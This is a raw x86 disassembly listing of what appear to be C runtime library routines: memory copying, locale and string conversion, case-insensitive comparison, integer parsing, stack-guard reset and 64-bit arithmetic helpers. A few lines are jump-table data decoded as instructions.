  428379:	add    DWORD PTR [edx+0x0],0xffffff80
  42837d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428381:	inc    esp
  428382:	mov    fs,esp
  428384:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428388:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42838c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428390:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428394:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283b8:	lea    eax,[ecx*4+0x0]
  4283bf:	add    esi,eax
  4283c1:	add    edi,eax
  4283c3:	jmp    DWORD PTR [edx*4+0x4283cc]
  4283ca:	mov    edi,edi
  4283cc:	fadd   QWORD PTR [ebx-0x7c1bffbe]
  4283d2:	inc    edx
  4283d3:	add    al,dh
  4283d5:	add    DWORD PTR [edx+0x0],0x4
  4283d9:	test   BYTE PTR [edx+0x0],al
  4283dc:	mov    eax,DWORD PTR [ebp+0x8]
  4283df:	pop    esi
  4283e0:	pop    edi
  4283e1:	leave  
  4283e2:	ret    
  4283e3:	nop
  4283e4:	mov    al,BYTE PTR [esi]
  4283e6:	mov    BYTE PTR [edi],al
  4283e8:	mov    eax,DWORD PTR [ebp+0x8]
  4283eb:	pop    esi
  4283ec:	pop    edi
  4283ed:	leave  
  4283ee:	ret    
  4283ef:	nop
  4283f0:	mov    al,BYTE PTR [esi]
  4283f2:	mov    BYTE PTR [edi],al
  4283f4:	mov    al,BYTE PTR [esi+0x1]
  4283f7:	mov    BYTE PTR [edi+0x1],al
  4283fa:	mov    eax,DWORD PTR [ebp+0x8]
  4283fd:	pop    esi
  4283fe:	pop    edi
  4283ff:	leave  
  428400:	ret    
  428401:	lea    ecx,[ecx+0x0]
  428404:	mov    al,BYTE PTR [esi]
  428406:	mov    BYTE PTR [edi],al
  428408:	mov    al,BYTE PTR [esi+0x1]
  42840b:	mov    BYTE PTR [edi+0x1],al
  42840e:	mov    al,BYTE PTR [esi+0x2]
  428411:	mov    BYTE PTR [edi+0x2],al
  428414:	mov    eax,DWORD PTR [ebp+0x8]
  428417:	pop    esi
  428418:	pop    edi
  428419:	leave  
  42841a:	ret    
  42841b:	nop
  42841c:	lea    esi,[ecx+esi*1-0x4]
  428420:	lea    edi,[ecx+edi*1-0x4]
  428424:	test   edi,0x3
  42842a:	jne    0x428450
  42842c:	shr    ecx,0x2
  42842f:	and    edx,0x3
  428432:	cmp    ecx,0x8
  428435:	jb     0x428444
  428437:	std    
  428438:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843a:	cld    
  42843b:	jmp    DWORD PTR [edx*4+0x428568]
  428442:	mov    edi,edi
  428444:	neg    ecx
  428446:	jmp    DWORD PTR [ecx*4+0x428518]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    eax,edi
  428452:	mov    edx,0x3
  428457:	cmp    ecx,0x4
  42845a:	jb     0x428468
  42845c:	and    eax,0x3
  42845f:	sub    ecx,eax
  428461:	jmp    DWORD PTR [eax*4+0x42846c]
  428468:	jmp    DWORD PTR [ecx*4+0x428568]
  42846f:	nop
  428470:	jl     0x4283f6
  428472:	inc    edx
  428473:	add    BYTE PTR [eax-0x37ffbd7c],ah
  428479:	test   BYTE PTR [edx+0x0],al
  42847c:	mov    al,BYTE PTR [esi+0x3]
  42847f:	and    edx,ecx
  428481:	mov    BYTE PTR [edi+0x3],al
  428484:	sub    esi,0x1
  428487:	shr    ecx,0x2
  42848a:	sub    edi,0x1
  42848d:	cmp    ecx,0x8
  428490:	jb     0x428444
  428492:	std    
  428493:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428495:	cld    
  428496:	jmp    DWORD PTR [edx*4+0x428568]
  42849d:	lea    ecx,[ecx+0x0]
  4284a0:	mov    al,BYTE PTR [esi+0x3]
  4284a3:	and    edx,ecx
  4284a5:	mov    BYTE PTR [edi+0x3],al
  4284a8:	mov    al,BYTE PTR [esi+0x2]
  4284ab:	shr    ecx,0x2
  4284ae:	mov    BYTE PTR [edi+0x2],al
  4284b1:	sub    esi,0x2
  4284b4:	sub    edi,0x2
  4284b7:	cmp    ecx,0x8
  4284ba:	jb     0x428444
  4284bc:	std    
  4284bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284bf:	cld    
  4284c0:	jmp    DWORD PTR [edx*4+0x428568]
  4284c7:	nop
  4284c8:	mov    al,BYTE PTR [esi+0x3]
  4284cb:	and    edx,ecx
  4284cd:	mov    BYTE PTR [edi+0x3],al
  4284d0:	mov    al,BYTE PTR [esi+0x2]
  4284d3:	mov    BYTE PTR [edi+0x2],al
  4284d6:	mov    al,BYTE PTR [esi+0x1]
  4284d9:	shr    ecx,0x2
  4284dc:	mov    BYTE PTR [edi+0x1],al
  4284df:	sub    esi,0x3
  4284e2:	sub    edi,0x3
  4284e5:	cmp    ecx,0x8
  4284e8:	jb     0x428444
  4284ee:	std    
  4284ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f1:	cld    
  4284f2:	jmp    DWORD PTR [edx*4+0x428568]
  4284f9:	lea    ecx,[ecx+0x0]
  4284fc:	sbb    al,0x85
  4284fe:	inc    edx
  4284ff:	add    BYTE PTR [eax*4-0x7ad3ffbe],ah
  428506:	inc    edx
  428507:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  42850e:	inc    edx
  42850f:	add    BYTE PTR [ebp+eax*4+0x42],al
  428513:	add    BYTE PTR [ebp+eax*4+0x42],cl
  428517:	add    BYTE PTR [edi-0x7b],bl
  42851a:	inc    edx
  42851b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428521:	inc    esp
  428522:	(bad)  
  428523:	sbb    al,0x8b
  428525:	inc    esp
  428526:	mov    ds,WORD PTR [eax]
  428528:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42852c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428530:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428534:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428538:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428540:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428548:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428550:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428554:	lea    eax,[ecx*4+0x0]
  42855b:	add    esi,eax
  42855d:	add    edi,eax
  42855f:	jmp    DWORD PTR [edx*4+0x428568]
  428566:	mov    edi,edi
  428568:	js     0x4284ef
  42856a:	inc    edx
  42856b:	add    BYTE PTR [eax-0x6fffbd7b],al
  428571:	test   DWORD PTR [edx+0x0],eax
  428574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428575:	test   DWORD PTR [edx+0x0],eax
  428578:	mov    eax,DWORD PTR [ebp+0x8]
  42857b:	pop    esi
  42857c:	pop    edi
  42857d:	leave  
  42857e:	ret    
  42857f:	nop
  428580:	mov    al,BYTE PTR [esi+0x3]
  428583:	mov    BYTE PTR [edi+0x3],al
  428586:	mov    eax,DWORD PTR [ebp+0x8]
  428589:	pop    esi
  42858a:	pop    edi
  42858b:	leave  
  42858c:	ret    
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    al,BYTE PTR [esi+0x2]
  428599:	mov    BYTE PTR [edi+0x2],al
  42859c:	mov    eax,DWORD PTR [ebp+0x8]
  42859f:	pop    esi
  4285a0:	pop    edi
  4285a1:	leave  
  4285a2:	ret    
  4285a3:	nop
  4285a4:	mov    al,BYTE PTR [esi+0x3]
  4285a7:	mov    BYTE PTR [edi+0x3],al
  4285aa:	mov    al,BYTE PTR [esi+0x2]
  4285ad:	mov    BYTE PTR [edi+0x2],al
  4285b0:	mov    al,BYTE PTR [esi+0x1]
  4285b3:	mov    BYTE PTR [edi+0x1],al
  4285b6:	mov    eax,DWORD PTR [ebp+0x8]
  4285b9:	pop    esi
  4285ba:	pop    edi
  4285bb:	leave  
  4285bc:	ret    
  4285bd:	push   ebp
  4285be:	mov    ebp,esp
  4285c0:	sub    esp,0xc
  4285c3:	mov    eax,ds:0x45d430
  4285c8:	xor    eax,DWORD PTR [ebp+0x4]
  4285cb:	and    BYTE PTR [ebp-0x6],0x0
  4285cf:	push   0x6
  4285d1:	mov    DWORD PTR [ebp-0x4],eax
  4285d4:	lea    eax,[ebp-0xc]
  4285d7:	push   eax
  4285d8:	push   0x1004
  4285dd:	push   DWORD PTR [ebp+0x8]
  4285e0:	call   DWORD PTR ds:0x4290fc
  4285e6:	test   eax,eax
  4285e8:	jne    0x4285ef
  4285ea:	or     eax,0xffffffff
  4285ed:	jmp    0x4285f9
  4285ef:	lea    eax,[ebp-0xc]
  4285f2:	push   eax
  4285f3:	call   0x4288fe
  4285f8:	pop    ecx
  4285f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4285fc:	xor    ecx,DWORD PTR [ebp+0x4]
  4285ff:	call   0x425a0c
  428604:	leave  
  428605:	ret    
  428606:	push   0x38
  428608:	push   0x429fb8
  42860d:	call   0x425340
  428612:	mov    eax,ds:0x45d430
  428617:	xor    eax,DWORD PTR [ebp+0x4]
  42861a:	mov    DWORD PTR [ebp-0x1c],eax
  42861d:	xor    edi,edi
  42861f:	mov    DWORD PTR [ebp-0x20],edi
  428622:	mov    DWORD PTR [ebp-0x24],edi
  428625:	mov    eax,DWORD PTR [ebp+0x14]
  428628:	mov    ebx,DWORD PTR [eax]
  42862a:	mov    DWORD PTR [ebp-0x28],ebx
  42862d:	mov    DWORD PTR [ebp-0x2c],edi
  428630:	mov    eax,DWORD PTR [ebp+0x8]
  428633:	cmp    eax,DWORD PTR [ebp+0xc]
  428636:	je     0x4287af
  42863c:	lea    ecx,[ebp-0x40]
  42863f:	push   ecx
  428640:	push   eax
  428641:	mov    esi,DWORD PTR ds:0x4290c4
  428647:	call   esi
  428649:	test   eax,eax
  42864b:	je     0x42866d
  42864d:	cmp    DWORD PTR [ebp-0x40],0x1
  428651:	jne    0x42866d
  428653:	lea    eax,[ebp-0x40]
  428656:	push   eax
  428657:	push   DWORD PTR [ebp+0xc]
  42865a:	call   esi
  42865c:	test   eax,eax
  42865e:	je     0x42866d
  428660:	cmp    DWORD PTR [ebp-0x40],0x1
  428664:	jne    0x42866d
  428666:	mov    DWORD PTR [ebp-0x2c],0x1
  42866d:	cmp    DWORD PTR [ebp-0x2c],edi
  428670:	je     0x42868c
  428672:	cmp    ebx,0xffffffff
  428675:	je     0x42867b
  428677:	mov    esi,ebx
  428679:	jmp    0x428687
  42867b:	push   DWORD PTR [ebp+0x10]
  42867e:	call   0x425950
  428683:	pop    ecx
  428684:	mov    esi,eax
  428686:	inc    esi
  428687:	mov    DWORD PTR [ebp-0x44],esi
  42868a:	jmp    0x42868f
  42868c:	mov    esi,DWORD PTR [ebp-0x44]
  42868f:	cmp    DWORD PTR [ebp-0x2c],edi
  428692:	jne    0x4286ae
  428694:	push   edi
  428695:	push   edi
  428696:	push   ebx
  428697:	push   DWORD PTR [ebp+0x10]
  42869a:	push   0x1
  42869c:	push   DWORD PTR [ebp+0x8]
  42869f:	call   DWORD PTR ds:0x4290ec
  4286a5:	mov    esi,eax
  4286a7:	mov    DWORD PTR [ebp-0x44],esi
  4286aa:	cmp    esi,edi
  4286ac:	je     0x428706
  4286ae:	mov    DWORD PTR [ebp-0x4],edi
  4286b1:	lea    eax,[esi+esi*1]
  4286b4:	add    eax,0x3
  4286b7:	and    eax,0xfffffffc
  4286ba:	call   0x425390
  4286bf:	mov    DWORD PTR [ebp-0x18],esp
  4286c2:	mov    ebx,esp
  4286c4:	mov    DWORD PTR [ebp-0x48],ebx
  4286c7:	lea    eax,[esi+esi*1]
  4286ca:	push   eax
  4286cb:	push   edi
  4286cc:	push   ebx
  4286cd:	call   0x427c40
  4286d2:	add    esp,0xc
  4286d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286d9:	jmp    0x4286f2
  4286db:	xor    eax,eax
  4286dd:	inc    eax
  4286de:	ret    
  4286df:	mov    esp,DWORD PTR [ebp-0x18]
  4286e2:	call   0x4287d5
  4286e7:	xor    edi,edi
  4286e9:	xor    ebx,ebx
  4286eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ef:	mov    esi,DWORD PTR [ebp-0x44]
  4286f2:	cmp    ebx,edi
  4286f4:	jne    0x428714
  4286f6:	push   esi
  4286f7:	push   0x2
  4286f9:	call   0x426458
  4286fe:	pop    ecx
  4286ff:	pop    ecx
  428700:	mov    ebx,eax
  428702:	cmp    ebx,edi
  428704:	jne    0x42870d
  428706:	xor    eax,eax
  428708:	jmp    0x4287c1
  42870d:	mov    DWORD PTR [ebp-0x24],0x1
  428714:	push   esi
  428715:	push   ebx
  428716:	push   DWORD PTR [ebp-0x28]
  428719:	push   DWORD PTR [ebp+0x10]
  42871c:	push   0x1
  42871e:	push   DWORD PTR [ebp+0x8]
  428721:	call   DWORD PTR ds:0x4290ec
  428727:	test   eax,eax
  428729:	je     0x4287b2
  42872f:	cmp    DWORD PTR [ebp+0x18],edi
  428732:	je     0x428754
  428734:	push   edi
  428735:	push   edi
  428736:	push   DWORD PTR [ebp+0x1c]
  428739:	push   DWORD PTR [ebp+0x18]
  42873c:	push   esi
  42873d:	push   ebx
  42873e:	push   edi
  42873f:	push   DWORD PTR [ebp+0xc]
  428742:	call   DWORD PTR ds:0x42907c
  428748:	test   eax,eax
  42874a:	je     0x4287b2
  42874c:	mov    eax,DWORD PTR [ebp+0x18]
  42874f:	mov    DWORD PTR [ebp-0x20],eax
  428752:	jmp    0x4287b2
  428754:	cmp    DWORD PTR [ebp-0x2c],edi
  428757:	jne    0x42876f
  428759:	push   edi
  42875a:	push   edi
  42875b:	push   edi
  42875c:	push   edi
  42875d:	push   esi
  42875e:	push   ebx
  42875f:	push   edi
  428760:	push   DWORD PTR [ebp+0xc]
  428763:	call   DWORD PTR ds:0x42907c
  428769:	mov    esi,eax
  42876b:	cmp    esi,edi
  42876d:	je     0x4287b2
  42876f:	push   esi
  428770:	push   0x1
  428772:	call   0x426458
  428777:	pop    ecx
  428778:	pop    ecx
  428779:	mov    DWORD PTR [ebp-0x20],eax
  42877c:	cmp    eax,edi
  42877e:	je     0x4287b2
  428780:	push   edi
  428781:	push   edi
  428782:	push   esi
  428783:	push   eax
  428784:	push   esi
  428785:	push   ebx
  428786:	push   edi
  428787:	push   DWORD PTR [ebp+0xc]
  42878a:	call   DWORD PTR ds:0x42907c
  428790:	cmp    eax,edi
  428792:	jne    0x4287a2
  428794:	push   DWORD PTR [ebp-0x20]
  428797:	call   0x425f4a
  42879c:	pop    ecx
  42879d:	mov    DWORD PTR [ebp-0x20],edi
  4287a0:	jmp    0x4287b2
  4287a2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287a6:	je     0x4287b2
  4287a8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287ab:	mov    DWORD PTR [ecx],eax
  4287ad:	jmp    0x4287b2
  4287af:	mov    ebx,DWORD PTR [ebp-0x48]
  4287b2:	cmp    DWORD PTR [ebp-0x24],edi
  4287b5:	je     0x4287be
  4287b7:	push   ebx
  4287b8:	call   0x425f4a
  4287bd:	pop    ecx
  4287be:	mov    eax,DWORD PTR [ebp-0x20]
  4287c1:	lea    esp,[ebp-0x54]
  4287c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287c7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287ca:	call   0x425a0c
  4287cf:	call   0x42537b
  4287d4:	ret    
  4287d5:	push   ebp
  4287d6:	mov    ebp,esp
  4287d8:	sub    esp,0x48
  4287db:	push   ebx
  4287dc:	push   esi
  4287dd:	push   edi
  4287de:	push   0x4
  4287e0:	pop    eax
  4287e1:	call   0x425390
  4287e6:	mov    ebx,esp
  4287e8:	push   0x1c
  4287ea:	lea    eax,[ebp-0x24]
  4287ed:	push   eax
  4287ee:	push   ebx
  4287ef:	call   DWORD PTR ds:0x429108
  4287f5:	test   eax,eax
  4287f7:	je     0x42886a
  4287f9:	mov    edi,DWORD PTR [ebp-0x20]
  4287fc:	lea    eax,[ebp-0x48]
  4287ff:	push   eax
  428800:	call   DWORD PTR ds:0x429048
  428806:	mov    eax,DWORD PTR [ebp-0x44]
  428809:	lea    esi,[eax-0x1]
  42880c:	not    esi
  42880e:	and    esi,ebx
  428810:	sub    esi,eax
  428812:	mov    DWORD PTR [ebp-0x4],eax
  428815:	mov    eax,ds:0x45dac4
  42881a:	mov    ecx,eax
  42881c:	dec    ecx
  42881d:	neg    ecx
  42881f:	sbb    ecx,ecx
  428821:	and    ecx,0xffff1000
  428827:	add    ecx,0x11000
  42882d:	add    ecx,edi
  42882f:	cmp    esi,ecx
  428831:	jb     0x42886a
  428833:	cmp    eax,0x1
  428836:	je     0x428882
  428838:	mov    ebx,edi
  42883a:	mov    edi,0x1000
  42883f:	push   0x1c
  428841:	lea    eax,[ebp-0x24]
  428844:	push   eax
  428845:	push   ebx
  428846:	call   DWORD PTR ds:0x429108
  42884c:	test   eax,eax
  42884e:	je     0x42886a
  428850:	add    ebx,DWORD PTR [ebp-0x18]
  428853:	test   DWORD PTR [ebp-0x14],edi
  428856:	je     0x42883f
  428858:	test   BYTE PTR [ebp-0xf],0x1
  42885c:	mov    ebx,DWORD PTR [ebp-0x24]
  42885f:	je     0x428866
  428861:	xor    eax,eax
  428863:	inc    eax
  428864:	jmp    0x42889e
  428866:	cmp    esi,ebx
  428868:	jae    0x42886e
  42886a:	xor    eax,eax
  42886c:	jmp    0x42889e
  42886e:	push   0x4
  428870:	push   edi
  428871:	push   DWORD PTR [ebp-0x4]
  428874:	push   ebx
  428875:	call   DWORD PTR ds:0x4290cc
  42887b:	mov    eax,ds:0x45dac4
  428880:	jmp    0x428884
  428882:	mov    ebx,esi
  428884:	dec    eax
  428885:	neg    eax
  428887:	sbb    eax,eax
  428889:	and    eax,0x103
  42888e:	lea    ecx,[ebp-0x8]
  428891:	push   ecx
  428892:	inc    eax
  428893:	push   eax
  428894:	push   DWORD PTR [ebp-0x4]
  428897:	push   ebx
  428898:	call   DWORD PTR ds:0x429104
  42889e:	lea    esp,[ebp-0x54]
  4288a1:	pop    edi
  4288a2:	pop    esi
  4288a3:	pop    ebx
  4288a4:	leave  
  4288a5:	ret    
  4288a6:	int3   
  4288a7:	int3   
  4288a8:	int3   
  4288a9:	int3   
  4288aa:	int3   
  4288ab:	int3   
  4288ac:	int3   
  4288ad:	int3   
  4288ae:	int3   
  4288af:	int3   
  4288b0:	push   ebp
  4288b1:	mov    ebp,esp
  4288b3:	push   edi
  4288b4:	push   esi
  4288b5:	push   ebx
  4288b6:	mov    esi,DWORD PTR [ebp+0xc]
  4288b9:	mov    edi,DWORD PTR [ebp+0x8]
  4288bc:	mov    al,0xff
  4288be:	mov    edi,edi
  4288c0:	or     al,al
  4288c2:	je     0x4288f6
  4288c4:	mov    al,BYTE PTR [esi]
  4288c6:	add    esi,0x1
  4288c9:	mov    ah,BYTE PTR [edi]
  4288cb:	add    edi,0x1
  4288ce:	cmp    ah,al
  4288d0:	je     0x4288c0
  4288d2:	sub    al,0x41
  4288d4:	cmp    al,0x1a
  4288d6:	sbb    cl,cl
  4288d8:	and    cl,0x20
  4288db:	add    al,cl
  4288dd:	add    al,0x41
  4288df:	xchg   al,ah
  4288e1:	sub    al,0x41
  4288e3:	cmp    al,0x1a
  4288e5:	sbb    cl,cl
  4288e7:	and    cl,0x20
  4288ea:	add    al,cl
  4288ec:	add    al,0x41
  4288ee:	cmp    al,ah
  4288f0:	je     0x4288c0
  4288f2:	sbb    al,al
  4288f4:	sbb    al,0xff
  4288f6:	movsx  eax,al
  4288f9:	pop    ebx
  4288fa:	pop    esi
  4288fb:	pop    edi
  4288fc:	leave  
  4288fd:	ret    
  4288fe:	push   esi
  4288ff:	push   edi
  428900:	call   0x4251f3
  428905:	mov    edi,DWORD PTR [eax+0x64]
  428908:	cmp    edi,DWORD PTR ds:0x45d58c
  42890e:	je     0x428917
  428910:	call   0x42669f
  428915:	mov    edi,eax
  428917:	mov    esi,DWORD PTR [esp+0xc]
  42891b:	cmp    DWORD PTR [edi+0x28],0x1
  42891f:	movzx  eax,BYTE PTR [esi]
  428922:	jle    0x428932
  428924:	push   0x8
  428926:	push   eax
  428927:	push   edi
  428928:	call   0x428986
  42892d:	add    esp,0xc
  428930:	jmp    0x42893c
  428932:	mov    ecx,DWORD PTR [edi+0x48]
  428935:	movzx  eax,BYTE PTR [ecx+eax*2]
  428939:	and    eax,0x8
  42893c:	test   eax,eax
  42893e:	je     0x428943
  428940:	inc    esi
  428941:	jmp    0x42891b
  428943:	movzx  ecx,BYTE PTR [esi]
  428946:	inc    esi
  428947:	cmp    ecx,0x2d
  42894a:	mov    edx,ecx
  42894c:	je     0x428953
  42894e:	cmp    ecx,0x2b
  428951:	jne    0x428957
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	xor    eax,eax
  428959:	cmp    ecx,0x30
  42895c:	jl     0x428968
  42895e:	cmp    ecx,0x39
  428961:	jg     0x428968
  428963:	sub    ecx,0x30
  428966:	jmp    0x42896b
  428968:	or     ecx,0xffffffff
  42896b:	cmp    ecx,0xffffffff
  42896e:	je     0x42897c
  428970:	lea    eax,[eax+eax*4]
  428973:	lea    eax,[ecx+eax*2]
  428976:	movzx  ecx,BYTE PTR [esi]
  428979:	inc    esi
  42897a:	jmp    0x428959
  42897c:	cmp    edx,0x2d
  42897f:	pop    edi
  428980:	pop    esi
  428981:	jne    0x428985
  428983:	neg    eax
  428985:	ret    
  428986:	push   ebp
  428987:	mov    ebp,esp
  428989:	push   ecx
  42898a:	mov    eax,DWORD PTR [ebp+0xc]
  42898d:	lea    ecx,[eax+0x1]
  428990:	cmp    ecx,0x100
  428996:	mov    ecx,DWORD PTR [ebp+0x8]
  428999:	ja     0x4289a4
  42899b:	mov    ecx,DWORD PTR [ecx+0x48]
  42899e:	movzx  eax,WORD PTR [ecx+eax*2]
  4289a2:	jmp    0x4289f8
  4289a4:	push   esi
  4289a5:	mov    edx,eax
  4289a7:	sar    edx,0x8
  4289aa:	push   edi
  4289ab:	mov    edi,DWORD PTR [ecx+0x48]
  4289ae:	movzx  esi,dl
  4289b1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289b6:	pop    edi
  4289b7:	pop    esi
  4289b8:	je     0x4289c9
  4289ba:	and    BYTE PTR [ebp-0x2],0x0
  4289be:	push   0x2
  4289c0:	mov    BYTE PTR [ebp-0x3],al
  4289c3:	mov    BYTE PTR [ebp-0x4],dl
  4289c6:	pop    eax
  4289c7:	jmp    0x4289d3
  4289c9:	and    BYTE PTR [ebp-0x3],0x0
  4289cd:	mov    BYTE PTR [ebp-0x4],al
  4289d0:	xor    eax,eax
  4289d2:	inc    eax
  4289d3:	push   0x1
  4289d5:	push   DWORD PTR [ecx+0x14]
  4289d8:	push   DWORD PTR [ecx+0x4]
  4289db:	lea    ecx,[ebp+0xe]
  4289de:	push   ecx
  4289df:	push   eax
  4289e0:	lea    eax,[ebp-0x4]
  4289e3:	push   eax
  4289e4:	push   0x1
  4289e6:	call   0x427a68
  4289eb:	add    esp,0x1c
  4289ee:	test   eax,eax
  4289f0:	jne    0x4289f4
  4289f2:	leave  
  4289f3:	ret    
  4289f4:	movzx  eax,WORD PTR [ebp+0xe]
  4289f8:	and    eax,DWORD PTR [ebp+0x10]
  4289fb:	leave  
  4289fc:	ret    
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	mov    eax,DWORD PTR [esp+0x8]
  428a04:	mov    ecx,DWORD PTR [esp+0x10]
  428a08:	or     ecx,eax
  428a0a:	mov    ecx,DWORD PTR [esp+0xc]
  428a0e:	jne    0x428a19
  428a10:	mov    eax,DWORD PTR [esp+0x4]
  428a14:	mul    ecx
  428a16:	ret    0x10
  428a19:	push   ebx
  428a1a:	mul    ecx
  428a1c:	mov    ebx,eax
  428a1e:	mov    eax,DWORD PTR [esp+0x8]
  428a22:	mul    DWORD PTR [esp+0x14]
  428a26:	add    ebx,eax
  428a28:	mov    eax,DWORD PTR [esp+0x8]
  428a2c:	mul    ecx
  428a2e:	add    edx,ebx
  428a30:	pop    ebx
  428a31:	ret    0x10
  428a34:	int3   
  428a35:	int3   
  428a36:	int3   
  428a37:	int3   
  428a38:	int3   
  428a39:	int3   
  428a3a:	int3   
  428a3b:	int3   
  428a3c:	int3   
  428a3d:	int3   
  428a3e:	int3   
  428a3f:	int3   
  428a40:	push   ebp
  428a41:	mov    ebp,esp
  428a43:	push   edi
  428a44:	push   esi
  428a45:	push   ebx
  428a46:	mov    ecx,DWORD PTR [ebp+0x10]
  428a49:	or     ecx,ecx
  428a4b:	je     0x428a9a
  428a4d:	mov    esi,DWORD PTR [ebp+0x8]
  428a50:	mov    edi,DWORD PTR [ebp+0xc]
  428a53:	mov    bh,0x41
  428a55:	mov    bl,0x5a
  428a57:	mov    dh,0x20
  428a59:	lea    ecx,[ecx+0x0]
  428a5c:	mov    ah,BYTE PTR [esi]
  428a5e:	or     ah,ah
  428a60:	mov    al,BYTE PTR [edi]
  428a62:	je     0x428a8b
  428a64:	or     al,al
  428a66:	je     0x428a8b
  428a68:	add    esi,0x1
  428a6b:	add    edi,0x1
  428a6e:	cmp    ah,bh
  428a70:	jb     0x428a78
  428a72:	cmp    ah,bl
  428a74:	ja     0x428a78
  428a76:	add    ah,dh
  428a78:	cmp    al,bh
  428a7a:	jb     0x428a82
  428a7c:	cmp    al,bl
  428a7e:	ja     0x428a82
  428a80:	add    al,dh
  428a82:	cmp    ah,al
  428a84:	jne    0x428a91
  428a86:	sub    ecx,0x1
  428a89:	jne    0x428a5c
  428a8b:	xor    ecx,ecx
  428a8d:	cmp    ah,al
  428a8f:	je     0x428a9a
  428a91:	mov    ecx,0xffffffff
  428a96:	jb     0x428a9a
  428a98:	neg    ecx
  428a9a:	mov    eax,ecx
  428a9c:	pop    ebx
  428a9d:	pop    esi
  428a9e:	pop    edi
  428a9f:	leave  
  428aa0:	ret    
  428aa1:	int3   
  428aa2:	int3   
  428aa3:	int3   
  428aa4:	int3   
  428aa5:	int3   
  428aa6:	int3   
  428aa7:	int3   
  428aa8:	int3   
  428aa9:	int3   
  428aaa:	int3   
  428aab:	int3   
  428aac:	int3   
  428aad:	int3   
  428aae:	int3   
  428aaf:	int3   
  428ab0:	push   esi
  428ab1:	mov    eax,DWORD PTR [esp+0x14]
  428ab5:	or     eax,eax
  428ab7:	jne    0x428ae1
  428ab9:	mov    ecx,DWORD PTR [esp+0x10]
  428abd:	mov    eax,DWORD PTR [esp+0xc]
  428ac1:	xor    edx,edx
  428ac3:	div    ecx
  428ac5:	mov    ebx,eax
  428ac7:	mov    eax,DWORD PTR [esp+0x8]
  428acb:	div    ecx
  428acd:	mov    esi,eax
  428acf:	mov    eax,ebx
  428ad1:	mul    DWORD PTR [esp+0x10]
  428ad5:	mov    ecx,eax
  428ad7:	mov    eax,esi
  428ad9:	mul    DWORD PTR [esp+0x10]
  428add:	add    edx,ecx
  428adf:	jmp    0x428b28
  428ae1:	mov    ecx,eax
  428ae3:	mov    ebx,DWORD PTR [esp+0x10]
  428ae7:	mov    edx,DWORD PTR [esp+0xc]
  428aeb:	mov    eax,DWORD PTR [esp+0x8]
  428aef:	shr    ecx,1
  428af1:	rcr    ebx,1
  428af3:	shr    edx,1
  428af5:	rcr    eax,1
  428af7:	or     ecx,ecx
  428af9:	jne    0x428aef
  428afb:	div    ebx
  428afd:	mov    esi,eax
  428aff:	mul    DWORD PTR [esp+0x14]
  428b03:	mov    ecx,eax
  428b05:	mov    eax,DWORD PTR [esp+0x10]
  428b09:	mul    esi
  428b0b:	add    edx,ecx
  428b0d:	jb     0x428b1d
  428b0f:	cmp    edx,DWORD PTR [esp+0xc]
  428b13:	ja     0x428b1d
  428b15:	jb     0x428b26
  428b17:	cmp    eax,DWORD PTR [esp+0x8]
  428b1b:	jbe    0x428b26
  428b1d:	dec    esi
  428b1e:	sub    eax,DWORD PTR [esp+0x10]
  428b22:	sbb    edx,DWORD PTR [esp+0x14]
  428b26:	xor    ebx,ebx
  428b28:	sub    eax,DWORD PTR [esp+0x8]
  428b2c:	sbb    edx,DWORD PTR [esp+0xc]
  428b30:	neg    edx
  428b32:	neg    eax
  428b34:	sbb    edx,0x0
  428b37:	mov    ecx,edx
  428b39:	mov    edx,ebx
  428b3b:	mov    ebx,ecx
  428b3d:	mov    ecx,eax
  428b3f:	mov    eax,esi
  428b41:	pop    esi
  428b42:	ret    0x10
  428b45:	int3   
  428b46:	int3   
  428b47:	int3   
  428b48:	int3   
  428b49:	int3   
  428b4a:	int3   
  428b4b:	int3   
  428b4c:	int3   
  428b4d:	int3   
  428b4e:	int3   
  428b4f:	int3   
  428b50:	lea    eax,[edx-0x1]
  428b53:	pop    ebx
  428b54:	ret    
